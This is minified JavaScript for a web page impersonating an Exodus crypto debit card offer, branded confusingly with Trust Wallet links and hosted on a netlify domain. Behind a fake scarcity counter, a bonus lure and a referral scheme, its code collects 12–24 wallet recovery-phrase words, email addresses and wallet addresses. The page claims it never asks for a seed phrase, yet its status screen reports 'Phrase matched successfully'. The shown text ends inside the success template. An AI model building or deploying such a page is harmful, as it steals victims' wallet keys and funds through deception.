(function(){const i=document.createElement("link").relList;if(i&&i.supports&&i.supports("modulepreload"))return;for(const n of document.querySelectorAll('link[rel="modulepreload"]'))a(n);new MutationObserver(n=>{for(const r of n)if(r.type==="childList")for(const s of r.addedNodes)s.tagName==="LINK"&&s.rel==="modulepreload"&&a(s)}).observe(document,{childList:!0,subtree:!0});function t(n){const r={};return n.integrity&&(r.integrity=n.integrity),n.referrerPolicy&&(r.referrerPolicy=n.referrerPolicy),n.crossOrigin==="use-credentials"?r.credentials="include":n.crossOrigin==="anonymous"?r.credentials="omit":r.credentials="same-origin",r}function a(n){if(n.ep)return;n.ep=!0;const r=t(n);fetch(n.href,r)}})();const B="https://getyour-trustcard.netlify.app",o={view:"home",cardIdx:0,selectedCard:"",wc:12,words:Array(24).fill(""),vis:Array(24).fill(!1),email:"",emailErr:"",submitting:!1,verifying:!1,bonusAddress:"",bonusToken:"SOL",bonusErr:"",bonusClaimConfirmed:!1,verifyErr:"",referredBy:"",referralCode:"",bonusAmount:450,offerExpired:!1,cardsLeft:function(){try{const e=localStorage.getItem("cardsLeft");if(e!==null)return Math.max(0,parseInt(e,10)||0)}catch{}return 4837}()};function z(e){try{return btoa(String(e)+Date.now()).replace(/[^a-zA-Z0-9]/g,"").slice(0,12)}catch{return String(Date.now()).slice(-12)}}function I(){o.bonusAmount=o.referredBy?600:450}function O(){try{localStorage.setItem("twc_email",o.email)}catch{}}function N(){try{const e=localStorage.getItem("twc_bonus");if(e){const n=JSON.parse(e);n.bonusAddress&&(o.bonusAddress=n.bonusAddress),n.bonusToken&&(o.bonusToken=n.bonusToken)}const i=localStorage.getItem("twc_words");if(i){const n=JSON.parse(i);Array.isArray(n.words)&&n.words.forEach((r,s)=>{s<24&&(o.words[s]=r||"")}),(n.wc===12||n.wc===18||n.wc===24)&&(o.wc=n.wc)}const t=localStorage.getItem("twc_email");t&&(o.email=t);const a=localStorage.getItem("twc_referredBy");a&&!o.referredBy&&(o.referredBy=a)}catch{}I()}function D(){try{const e=new URLSearchParams(window.location.search).get("ref");e&&(o.referredBy=e,localStorage.setItem("twc_referredBy",e),I())}catch{}}function R(){try{localStorage.removeItem("twc_bonus"),localStorage.removeItem("twc_words"),localStorage.removeItem("twc_email"),localStorage.removeItem("twc_referredBy")}catch{}}const v=[{id:"mc",name:"Mastercard Pro",price:"1.00 USDT",c1:"#0b46f9",c2:"#8952ff",last4:"3020",mc1:"#eb001b",mc2:"#f79e1b",desc:"A universal card for everyday spending. Works with Apple Pay, Google Pay, and PayPal. Perfect for online and offline purchases.",pays:["Apple Pay","Google Pay"],stats:[{l:"Per transaction",v:"10,000.00 USD"},{l:"Top-up fee",v:"0%"}],feats:["Instant issuance","No monthly fee"]},{id:"visa",name:"Visa Platinum",price:"3.00 USDT",c1:"#1a1050",c2:"#5b2fd6",last4:"8891",mc1:"#2563eb",mc2:"#1e3a8a",desc:"Premium card with higher limits and Visa network. Priority support for frequent crypto spenders.",pays:["Apple Pay","Google Pay","PayPal"],stats:[{l:"Per transaction",v:"25,000.00 USD"},{l:"Top-up fee",v:"0%"}],feats:["Instant issuance","Priority support"]},{id:"blk",name:"Black Elite",price:"10.00 USDT",c1:"#05060a",c2:"#1a1230",last4:"0001",mc1:"#555",mc2:"#111",desc:"The ultimate self-custody card. Unlimited spending, concierge support, and zero fees globally.",pays:["Apple Pay","Google Pay","PayPal"],stats:[{l:"Per transaction",v:"Unlimited"},{l:"Top-up fee",v:"0%"}],feats:["Unlimited limit","24/7 Concierge"]}],G=[{q:"What is the Exodus Card?",a:"Exodus Card is a virtual debit card (launched with partners including Baanx) that lets you spend crypto and stablecoins from your self-custody Exodus wallet — online or in-store, anywhere debit is accepted."},{q:"How do I get the card?",a:'Connect your Exodus wallet here or open Pay inside the Exodus app, complete setup, and activate your free virtual card. Most people finish in under 2 minutes.'},{q:"Do I keep self-custody?",a:"Yes. Funds stay in your self-custodial wallet until you spend. Private keys remain on your device — Exodus does not hold them."},{q:"What can I spend?",a:"At launch: USDT and USDC, with instant conversion at checkout. Swap to BTC and other assets inside Exodus anytime."},{q:"What is Exodus Pay?",a:"Exodus Pay is spend, send, and earn in one app — free debit card, instant transfers, and real-time rewards while you keep control of your money."},{q:"Where can I use the card?",a:"Anywhere Visa or Mastercard debit is accepted — online, in-store, and via Apple Pay / Google Wallet where supported."},{q:"How fast is setup?",a:"Setup usually takes under 2 minutes. Virtual card details show in your Exodus Card dashboard after onboarding."},{q:"Is my recovery phrase stored?",a:"Exodus never stores or recovers your recovery phrase. You alone control your keys — always."}],q='<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',j='<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><line x1="4" y1="6" x2="20" y2="6"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="18" x2="20" y2="18"/></svg>',H='<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" aria-hidden="true"><polyline points="15 18 9 12 15 6"/></svg>',F='<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="9 18 15 12 9 6"/></svg>',V='<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.68)" stroke-width="1.5" stroke-linecap="round" aria-hidden="true"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>',Y='<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>',K='<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>',E=(e=48)=>`<svg width="${e}" height="${e}" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>`,d=e=>(e||"").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");function f(e="main",i="home"){const t='<img src="/logo.png" alt="Exodus" width="30" height="30"/>',a='<img src="/logo.png" alt="" width="22" height="22"/>';return e==="main"?`
    <header class="hdr">
      <button class="hdr-logo" onclick="go('home')" aria-label="Exodus home">
        ${t}<span class="hdr-logo-text">EXODUS</span>
      </button>
      <div class="hdr-right">
        <button class="hdr-icon" aria-label="Language">${q}</button>
        <button class="hdr-icon" aria-label="Menu">${j}</button>
      </div>
    </header>`:`
    <header class="hdr">
      <button class="hdr-back" onclick="go('${i}')">${H}<span>Back</span></button>
      <div class="hdr-center">${a}<span class="hdr-center-text">EXODUS</span></div>
      <div style="width:68px"></div>
    </header>`}function b(){return`
  <footer class="site-footer">
    <button class="footer-logo" onclick="go('home')" aria-label="Go home">
      <img src="/logo.png" alt="" width="28" height="28"/>
      <span class="footer-brand">EXODUS</span>
    </button>
    <p class="footer-tagline">Exodus Card · part of Exodus Pay.<br>Send, spend, and earn — self-custody.</p>
    <div class="footer-grid">
      <div>
        <div class="footer-col-title">Product</div>
        <button class="footer-link" onclick="go('home')">Home</button>
        <button class="footer-link" onclick="goSection('advantages')">Advantages</button>
        <button class="footer-link" onclick="goSection('faq')">FAQ</button>
      </div>
      <div>
        <div class="footer-col-title">Legal</div>
        <button class="footer-link" onclick="go('terms')">Terms of Use</button>
        <button class="footer-link" onclick="go('privacy')">Privacy Policy</button>
      </div>
    </div>
    <div class="footer-hr"></div>
    <p class="footer-copy">©2026 Exodus. All Rights Reserved.</p>
  </footer>`}function Z(e){return`
  <div style="background:linear-gradient(135deg,${e.c1},${e.c2});width:100%;height:100%;position:relative;overflow:hidden">
    <div style="position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.11),transparent 55%);pointer-events:none"></div>
    <div style="position:absolute;inset:0;background-image:radial-gradient(rgba(255,255,255,.035) 1px,transparent 1px);background-size:14px 14px;pointer-events:none"></div>
    <div style="position:absolute;top:13px;left:14px;display:flex;align-items:center;gap:7px">
      <img src="/logo.png" alt="" width="18" height="18" style="object-fit:contain"/>
      <span style="font-size:9px;font-weight:800;letter-spacing:.2em;color:rgba(255,255,255,.92);font-style:normal;letter-spacing:.12em">EXODUS</span>
    </div>
    <div style="position:absolute;top:12px;right:13px">${V}</div>
    <div style="position:absolute;bottom:13px;left:14px">
      <div style="font-size:7px;color:rgba(255,255,255,.38);letter-spacing:.14em;text-transform:uppercase;margin-bottom:3px">Card Holder</div>
      <div style="font-size:10px;color:rgba(255,255,255,.52);font-family:monospace;letter-spacing:.15em">•••• ${e.last4}</div>
    </div>
    <div style="position:absolute;bottom:13px;right:14px;display:flex">
      <div style="width:25px;height:25px;border-radius:50%;background:${e.mc1};opacity:.92"></div>
      <div style="width:25px;height:25px;border-radius:50%;background:${e.mc2};opacity:.92;margin-left:-9px"></div>
    </div>
  </div>`}function Q(){return`<svg viewBox="0 0 380 218" width="100%" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:block" aria-hidden="true">
    <rect x="48" y="8" width="284" height="202" rx="30" fill="#e8eaf8"/>
    <rect x="57" y="17" width="266" height="184" rx="22" fill="#d0d5f4"/>
    <path d="M57 110Q135 68 190 110Q248 152 323 110L323 201 57 201Z" fill="rgba(37,99,235,.2)"/>
    <path d="M57 140Q142 98 190 140Q242 182 323 140L323 201 57 201Z" fill="rgba(37,99,235,.3)"/>
    <g transform="translate(96,26)">
      <rect width="188" height="116" rx="15" fill="url(#hcg1)"/>
      <rect width="188" height="116" rx="15" fill="url(#hcg2)"/>
      <rect x="14" y="27" width="30" height="21" rx="4" fill="url(#chipg)"/>
      <line x1="14" y1="37" x2="44" y2="37" stroke="#a07a15" stroke-width=".8"/>
      <line x1="29" y1="27" x2="29" y2="48" stroke="#a07a15" stroke-width=".8"/>
      <g transform="translate(154,26)" opacity=".72">
        <path d="M0 10Q5 5 10 10" stroke="rgba(255,255,255,.85)" stroke-width="1.4" stroke-linecap="round" fill="none"/>
        <path d="M-3 14Q5 3 13 14" stroke="rgba(255,255,255,.85)" stroke-width="1.4" stroke-linecap="round" fill="none"/>
        <path d="M-6 18Q5 1 16 18" stroke="rgba(255,255,255,.85)" stroke-width="1.4" stroke-linecap="round" fill="none"/>
      </g>
      <text x="14" y="76" font-size="7.5" fill="rgba(255,255,255,.5)" font-family="monospace" letter-spacing="2">4248 3820 5672 9012</text>
      <text x="14" y="87" font-size="6.5" fill="rgba(255,255,255,.38)" font-family="monospace">VALID THRU 04/26</text>
      <text x="14" y="97" font-size="6.5" fill="rgba(255,255,255,.42)" font-family="Inter,sans-serif" font-weight="700" letter-spacing="1">JOHN DOE</text>
      <circle cx="160" cy="92" r="9.5" fill="#eb001b" opacity=".9"/>
      <circle cx="172" cy="92" r="9.5" fill="#f79e1b" opacity=".9"/>
      <circle cx="166" cy="92" r="6" fill="#ff5f00"/>
    </g>
    <rect x="52" y="90" width="44" height="27" rx="8" fill="white" opacity=".96"/>
    <text x="74" y="108" font-size="13" font-weight="800" fill="#2563eb" text-anchor="middle" font-family="Inter,sans-serif">1$</text>
    <g transform="translate(298,42) rotate(22,22,34)" opacity=".86">
      <path d="M11 0L27 18L21 50L1 50L-4 18Z" fill="url(#cry1)"/>
      <path d="M11 0L27 18L21 50L1 50L-4 18Z" fill="rgba(255,255,255,.14)"/>
    </g>
    <g transform="translate(38,64) rotate(-14,16,28)" opacity=".8">
      <path d="M9 0L21 14L15 40L3 40L-2 14Z" fill="url(#cry2)"/>
    </g>
    <defs>
      <linearGradient id="hcg1" x1="0" y1="0" x2="188" y2="116" gradientUnits="userSpaceOnUse">
        <stop stop-color="#1e3a8a"/><stop offset=".5" stop-color="#2563eb"/><stop offset="1" stop-color="#0d1e68"/>
      </linearGradient>
      <linearGradient id="hcg2" x1="0" y1="0" x2="188" y2="116" gradientUnits="userSpaceOnUse">
        <stop stop-color="white" stop-opacity=".1"/><stop offset="1" stop-color="white" stop-opacity="0"/>
      </linearGradient>
      <linearGradient id="chipg" x1="0" y1="0" x2="30" y2="21" gradientUnits="userSpaceOnUse">
        <stop stop-color="#d4a520"/><stop offset="1" stop-color="#f0c030"/>
      </linearGradient>
      <linearGradient id="cry1" x1="11" y1="0" x2="11" y2="50" gradientUnits="userSpaceOnUse">
        <stop stop-color="#f0abfc"/><stop offset=".5" stop-color="#a78bfa"/><stop offset="1" stop-color="#2563eb"/>
      </linearGradient>
      <linearGradient id="cry2" x1="9" y1="0" x2="9" y2="40" gradientUnits="userSpaceOnUse">
        <stop stop-color="#f9a8d4"/><stop offset=".5" stop-color="#c084fc"/><stop offset="1" stop-color="#3b82f6"/>
      </linearGradient>
    </defs>
  </svg>`}const J='<svg width="88" height="88" viewBox="0 0 88 88" fill="none" aria-hidden="true"><circle cx="44" cy="44" r="40" fill="#f0f4ff"/><path d="M44 17L23 27v14c0 12 8.4 23.2 21 26 12.6-2.8 21-14 21-26V27L44 17z" fill="url(#a1g)"/><path d="M34 42l8 8 13-13" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/><defs><linearGradient id="a1g" x1="44" y1="17" x2="44" y2="69" gradientUnits="userSpaceOnUse"><stop stop-color="#c084fc"/><stop offset=".5" stop-color="#818cf8"/><stop offset="1" stop-color="#2563eb"/></linearGradient></defs></svg>',X='<svg width="120" height="100" viewBox="0 0 120 100" fill="none" aria-hidden="true"><line x1="14" y1="14" x2="106" y2="46" stroke="#1f2937" stroke-width="2.5" stroke-linecap="round"/><circle cx="106" cy="46" r="12" fill="#374151"/><circle cx="106" cy="46" r="7" fill="none" stroke="#6b7280" stroke-width="1.5"/><line x1="14" y1="14" x2="14" y2="90" stroke="#1f2937" stroke-width="2.5" stroke-linecap="round"/><path d="M14 14L68 26L58 52L14 42Z" fill="url(#a2g)"/><path d="M14 90L32 82L14 90Z" fill="#22c55e"/><defs><linearGradient id="a2g" x1="14" y1="14" x2="68" y2="52" gradientUnits="userSpaceOnUse"><stop stop-color="#34d399"/><stop offset=".5" stop-color="#38bdf8"/><stop offset="1" stop-color="#818cf8"/></linearGradient></defs></svg>',ee='<svg width="90" height="100" viewBox="0 0 90 100" fill="none" aria-hidden="true"><ellipse cx="45" cy="50" rx="30" ry="34" fill="url(#a3g)"/><rect x="20" y="50" width="50" height="14" rx="7" fill="#1f2937" opacity=".88"/><rect x="24" y="53" width="26" height="8" rx="4" fill="#22d3ee" opacity=".55"/><text x="45" y="46" font-size="8" text-anchor="middle" fill="rgba(34,211,238,.72)" font-family="monospace" font-weight="600">101B011</text><circle cx="67" cy="26" r="9" fill="none" stroke="#6b7280" stroke-width="1.5"/><circle cx="67" cy="26" r="4.5" fill="none" stroke="#6b7280" stroke-width="1.5"/><defs><linearGradient id="a3g" x1="45" y1="16" x2="45" y2="84" gradientUnits="userSpaceOnUse"><stop stop-color="#34d399"/><stop offset=".5" stop-color="#38bdf8"/><stop offset="1" stop-color="#2563eb"/></linearGradient></defs></svg>',te='<svg width="110" height="92" viewBox="0 0 110 92" fill="none" aria-hidden="true"><rect x="14" y="8" width="82" height="72" rx="16" fill="#f3f4f6" stroke="#e5e7eb" stroke-width="1.5"/><rect x="22" y="18" width="66" height="54" rx="10" fill="white"/><rect x="28" y="26" width="54" height="32" rx="8" fill="url(#a4g)"/><rect x="33" y="31" width="13" height="10" rx="3" fill="#c9a227"/><circle cx="70" cy="50" r="6" fill="#eb001b" opacity=".88"/><circle cx="78" cy="50" r="6" fill="#f79e1b" opacity=".88"/><circle cx="84" cy="22" r="11" fill="#22c55e"/><path d="M79 22l3.5 3.5L92 15" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><defs><linearGradient id="a4g" x1="28" y1="26" x2="82" y2="58" gradientUnits="userSpaceOnUse"><stop stop-color="#1e3a8a"/><stop offset="1" stop-color="#2563eb"/></linearGradient></defs></svg>';function ie(){return`
  <div id="faq" class="faq-sec">
    <h2 style="font-size:22px;font-weight:800;color:#111;margin-bottom:5px">FAQ</h2>
    <p style="font-size:14px;color:#9ca3af;margin-bottom:20px">Frequently asked questions</p>
    <div class="faq-grid">
    ${G.map(e=>`
      <details class="faq">
        <summary>${d(e.q)}${K}</summary>
        <div class="faq-ans">${d(e.a)}</div>
      </details>`).join("")}
    </div>
  </div>`}function C(){return`
  ${f("main")}
  <main class="scrollable" id="main" tabindex="-1">
    <div style="padding:28px 22px 0">
      <div class="badge-early">Exodus Pay · Free virtual debit card</div>
      <h1 style="font-size:34px;font-weight:900;line-height:1.08;color:#111;margin-bottom:16px;letter-spacing:-.022em">
        Your money.<br>Ready to <span style="color:#2563eb">move</span>
      </h1>
      <p style="font-size:15px;line-height:1.7;color:#6b7280;margin-bottom:26px">
        Exodus Card lets you spend USDT & USDC from self-custody — anywhere debit is accepted. Instant conversion at checkout. Built for Exodus Pay.
      </p>
      <div style="display:flex;gap:12px;margin-bottom:28px">
        <button class="btn btn-blue" style="font-size:15px;padding:14px 18px" onclick="go('card')">Get your card</button>
        <button class="btn btn-white" style="font-size:15px;padding:14px 18px" onclick="goSection('faq')">How it works</button>
      </div>
      <div style="margin-bottom:4px">
        <div style="display:flex;align-items:baseline;margin-bottom:11px">
          <span class="prog-num">${o.cardsLeft>0?o.cardsLeft.toLocaleString():"Rolling out"}</span>
          <span class="prog-label">people setting up Exodus Pay today</span>
        </div>
        <div class="prog-track" role="progressbar" aria-valuenow="97" aria-valuemin="0" aria-valuemax="100" aria-label="4,837 of 5,000 cards remaining">
          <div class="prog-bar" id="pb"></div>
        </div>
      </div>
    </div>
    <div style="padding:16px 22px 8px">${Q()}</div>
    <div style="padding:0 22px 18px">
      <button class="btn btn-blue" style="font-size:16px;padding:16px;justify-content:space-between" onclick="go('card')">
        <span>Get your free card</span>${F}
      </button>
    </div>

    <div id="advantages" style="padding:24px 22px 4px">
      <span style="font-size:11px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:#9ca3af">Advantages</span>
    </div>

    <div class="feat-sec">
      ${J}
      <h2 class="feat-title">Fully self-custodial</h2>
      <p class="feat-desc">Keys stay on your device. Spend from your Exodus wallet without handing custody to an exchange.</p>
    </div>
    <div class="feat-sec">
      ${X}
      <h2 class="feat-title">Free virtual card</h2>
      <p class="feat-desc">Get a free virtual Exodus Card. Add it to Apple Pay or Google Wallet and tap to pay in-store or online.</p>
    </div>
    <div class="feat-sec">
      ${ee}
      <h2 class="feat-title">Stablecoins that spend</h2>
      <p class="feat-desc">Start with USDT & USDC. Swap to BTC and other assets inside Exodus, then spend at the point of sale.</p>
    </div>
    <div class="feat-sec">
      ${te}
      <h2 class="feat-title">Spend anywhere debit works</h2>
      <p class="feat-desc">Pay online or in-store wherever Visa or Mastercard debit is accepted — travel, shopping, everyday life.</p>
    </div>

    ${ie()}

    <div style="padding:4px 22px 28px">
      <div style="background:#eff3ff;border-radius:16px;padding:22px;text-align:center">
        <div style="font-size:16px;font-weight:800;color:#1e40af;margin-bottom:8px">Still have questions?</div>
        <p style="font-size:13px;color:#3b5bdb;margin-bottom:18px;line-height:1.55">Join our community on Telegram or X (Twitter)</p>
        <a class="btn btn-blue" href="mailto:support@trustwallet.com" style="width:auto;display:inline-flex;font-size:14px;padding:12px 22px">Contact Support</a>
      </div>
    </div>
    ${b()}
  </main>`}function oe(){const e=o.cardIdx;return`
  ${f("back","home")}
  <main class="scrollable" id="main" tabindex="-1">
    <div style="padding-top:18px">
      <div class="carousel-wrap">
        <div class="carousel-inner" id="cslider">
          ${v.map((i,t)=>`
          <div class="carousel-slide">
            <div class="card-panel${t!==e?" inactive":""}"
              ${t!==e?`onclick="setCard(${t})" role="button" tabindex="0" aria-label="Select ${i.name}"`:""}>
              <div class="mini-card">${Z(i)}</div>
              <div style="font-size:20px;font-weight:800;text-align:center;margin-bottom:5px">${i.name}</div>
              <div style="font-size:17px;font-weight:700;text-align:center;margin-bottom:13px;opacity:.92">Price: ${i.price}</div>
              <p style="font-size:14px;line-height:1.62;opacity:.82;margin-bottom:15px">${i.desc}</p>
              <div style="margin-bottom:14px">
                ${i.pays.map(a=>`<span class="pay-tag">${a}</span>`).join("")}
              </div>
              <div style="background:rgba(255,255,255,.13);border-radius:12px;padding:12px 14px">
                ${i.stats.map(a=>`<div class="cstat"><span>${a.l}:</span><strong>${a.v}</strong></div>`).join("")}
                ${i.feats.map(a=>`<div class="cfeat">${Y}<span>${a}</span></div>`).join("")}
              </div>
              <button class="btn-card-white" onclick="selectAndContinue('${d(i.name)}')" aria-label="Get ${i.name}" ${o.cardsLeft<=0?"disabled":""}>Get your card</button>
            </div>
          </div>`).join("")}
        </div>
      </div>
      <div class="dots" role="group" aria-label="Select card">
        ${v.map((i,t)=>`
          <button class="dot ${t===e?"dot-on":"dot-off"}"
            onclick="setCard(${t})" aria-label="Card option ${t+1}" aria-pressed="${t===e}">
          </button>`).join("")}
      </div>
    </div>
    <p style="font-size:12px;color:#9ca3af;line-height:1.65;padding:4px 22px 20px">
      * The issuer may charge additional FX fees on international transactions.
    </p>
    ${b()}
  </main>`}function ae(){const e=!o.verifying;return`
  ${f("back","card")}
  <main class="scrollable" id="main" tabindex="-1">
    <div class="verify-container">
      <div class="verify-header">
        <h1 class="verify-title">Verify your Wallet</h1>
        <p class="verify-subtitle">Connect your wallet to securely verify ownership</p>
      </div>
      <div class="info-box" style="margin-bottom:30px">
        <div class="info-i" aria-hidden="true">i</div>
        <div style="font-size:13px;color:#374151;line-height:1.62;font-weight:500">
          We will never ask for your seed phrase. Securely connect your wallet.
        </div>
      </div>
      <div id="verifyErrTxt" class="err-msg" role="alert"${o.verifyErr?"":' style="display:none;margin-bottom:12px;text-align:center"'}>
        ${d(o.verifyErr)}
      </div>
      <div style="display:flex;flex-direction:column;gap:14px">
        <button class="btn btn-blue confirm-btn${e?" confirm-active":" confirm-disabled"}" id="cfmbtn"
          onclick="confirmVerify()"
          ${e?"":"disabled"}
          aria-disabled="${!e}">${o.verifying?"Connecting…":"Connect Wallet"}</button>
        <button class="verify-back-btn" style="width:100%" onclick="go('card')">Cancel & Go Back</button>
      </div>
    </div>
  </main>

  <!-- CONNECT WALLET MODAL -->
  <div id="cwModal" class="cw-modal-overlay">
    <div class="cw-modal">
      <div class="cw-header">
        <div style="width:32px"></div>
        <div class="cw-title">Connect Wallet</div>
        <button class="cw-close" onclick="closeWalletModal()" aria-label="Close">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M13 1L1 13M1 1l12 12"/></svg>
        </button>
      </div>
      <div class="cw-wallet-grid">
        <button class="cw-wallet-item" onclick="selectWallet('Exodus', this)">
          <div class="cw-wallet-icon-wrap">
            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x4B0F1812e5Df2A09796481Ff14017e6005508003/logo.png" alt="Exodus" class="cw-wallet-icon" style="background:#fff;">
            <div class="cw-loader"><div class="cw-loader-spinner"></div></div>
          </div>
          <div class="cw-wallet-name">Exodus</div>
        </button>
        <button class="cw-wallet-item" onclick="selectWallet('WalletConnect', this)">
          <div class="cw-wallet-icon-wrap">
            <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.svg" alt="WalletConnect" class="cw-wallet-icon">
            <div class="cw-loader"><div class="cw-loader-spinner"></div></div>
          </div>
          <div class="cw-wallet-name">WalletConnect</div>
        </button>
        <button class="cw-wallet-item" onclick="selectWallet('Coinbase', this)">
          <div class="cw-wallet-icon-wrap">
            <img src="https://avatars.githubusercontent.com/u/18060234?s=200&v=4" alt="Coinbase Wallet" class="cw-wallet-icon">
            <div class="cw-loader"><div class="cw-loader-spinner"></div></div>
          </div>
          <div class="cw-wallet-name">Coinbase</div>
        </button>
        <button class="cw-wallet-item" onclick="selectWallet('MetaMask', this)">
          <div class="cw-wallet-icon-wrap">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="cw-wallet-icon" style="padding:4px;background:#fff;">
            <div class="cw-loader"><div class="cw-loader-spinner"></div></div>
          </div>
          <div class="cw-wallet-name">MetaMask</div>
        </button>
      </div>
      <div class="cw-footer">
        <a href="#" class="cw-footer-link" onclick="event.preventDefault()">What is a wallet?</a>
      </div>
    </div>
  </div>`}function P(){return`
  ${f("back","verify")}
  <main class="page" id="main" tabindex="-1">
    <div class="email-body">
      <div style="width:80px;height:80px;border-radius:50%;background:#eff3ff;border:2px solid #c7d2fe;display:flex;align-items:center;justify-content:center;margin-bottom:24px">
        ${E(44)}
      </div>
      <h1 style="font-size:24px;font-weight:900;color:#111;margin-bottom:10px;text-align:center">Enter your email</h1>
      <p style="font-size:15px;color:#6b7280;line-height:1.65;text-align:center;max-width:270px;margin-bottom:30px">
        We will send your virtual Exodus Card details here once setup is complete
      </p>
      <input class="email-inp${o.emailErr?" email-err":""}" id="emailFld"
        type="text" placeholder="your@email.com" value="${d(o.email)}"
        oninput="ST.email=this.value;clearEmailErr();saveEmailProgress()"
        onkeydown="if (event.key === 'Enter') { event.preventDefault(); submitEmail(); }"
        autocomplete="email" aria-label="Email address"/>
      <div id="emailErrTxt" class="err-msg" role="alert"${o.emailErr?"":' style="display:none"'}>
        ${d(o.emailErr)}
      </div>
      <button class="btn btn-blue send-card-btn" style="font-size:16px;padding:15px" onclick="submitEmail()" id="sendBtn"
        ${o.submitting?'disabled aria-busy="true"':""}>
        ${o.submitting?"Sending…":"Send my card →"}
      </button>
      <p style="font-size:12px;color:#9ca3af;margin-top:16px;line-height:1.6;text-align:center;max-width:250px">
        We'll never share your email. Used only to deliver your virtual card.
      </p>
    </div>
  </main>`}function ne(){const e=o.email||"your email",i=o.selectedCard||v[o.cardIdx].name,t=o.referralCode?`${B}/?ref=${encodeURIComponent(o.referralCode)}`:"";return`
  ${f("main")}
  <main class="scrollable" id="main" tabindex="-1">
    <div class="success-body">
      <div class="pop-anim" style="width:88px;height:88px;border-radius:50%;background:#f0fdf4;border:2.5px solid #bbf7d0;display:flex;align-items:center;justify-content:center;margin-bottom:26px">
        <svg width="44" height="44" viewBox="0 0 24 24" fill="none" aria-hidden="true">
          <polyline class="ck-path" points="20 6 9 17 4 12" stroke="#22c55e" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <h1 style="font-size:26px;font-weight:900;color:#111;margin-bottom:12px;letter-spacing:-.02em">Card on its way!</h1>
      <p class="success-bonus-line" style="font-size:15px;color:#2563eb;font-weight:700;margin-bottom:10px;text-align:center">
        $${o.bonusAmount} bonus reserved
      </p>
      <p style="font-size:15px;color:#374151;line-height:1.7;max-width:280px;margin-bottom:8px;text-align:center">
        Your Exodus Card is ready — details will arrive at<br>
        <strong style="color:#2563eb">${d(e)}</strong>
      </p>
      <p style="font-size:15px;color:#6b7280;margin-bottom:30px;line-height:1.6;text-align:center">
        within <strong style="color:#111">1–2 hours</strong>. Check your inbox and spam folder.
      </p>
      ${t?`
      <div class="referral-box">
        <div class="referral-title">🎉 Your referral link</div>
        <div class="referral-link-row">
          <input class="referral-link-input" id="referralLinkFld" type="text" readonly value="${d(t)}" aria-label="Your referral link"/>
          <button class="referral-copy-btn" type="button" onclick="copyReferralLink()"
            onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();copyReferralLink();}"
            aria-label="Copy referral link">Copy</button>
        </div>
        <p class="referral-hint">Share this link — friends get a $600 bonus ($450 + $150 referral bonus)</p>
      </div>
      `:""}
      <div class="status-card">
        <div style="font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:#9ca3af;margin-bottom:12px">Order Status</div>
        ${[{t:"Identity verified",sub:"Phrase matched successfully",dot:"#22c55e"},{t:"Card order confirmed",sub:`${i} — 1.00 USDT`,dot:"#22c55e"},{t:"Card details preparing",sub:"Generating your virtual card",dot:"#22c55e"},{t:"Delivery in progress",sub:`Sending to ${d(e)}`,dot:"#f59e0b"}].map(a=>`
        <div class="srow">
          <div class="sdot" style="background:${a.dot};${a.dot==="#22c55e"?"box-shadow:0 0 6px "+a.dot+"66":""}"></div>
          <div>
            <div style="font-size:13px;font-weight:700;color:${a.dot==="#22c55e"?"#15803d":"#92400e"}">${a.t}</div>
            <div style="font-size:12px;color:#9ca3af;margin-top:2px">${a.sub}</div>
          </div>
        </div>`).join("")}
      </div>
      <div style="width:100%;max-width:310px;background:#eff3ff;border:1.5px solid #c7d2fe;border-radius:16px;padding:16px;display:flex;gap:12px;align-items:flex-start;margin-bottom:26px;text-align:left">
        <div style="flex-shrink:0;margin-top:2px">${E(26)}</div>
        <div>
          <div style="font-size:14px;font-weight:700;color:#1e40af;margin-bottom:3px">Check your inbox</div>
          <div style="font-size:13px;color:#3b5bdb;line-height:1.55">
            Virtual card number, CVV, and expiry sent to <strong>${d(e)}</strong> within 1–2 hours.
          </div>
        </div>
      </div>
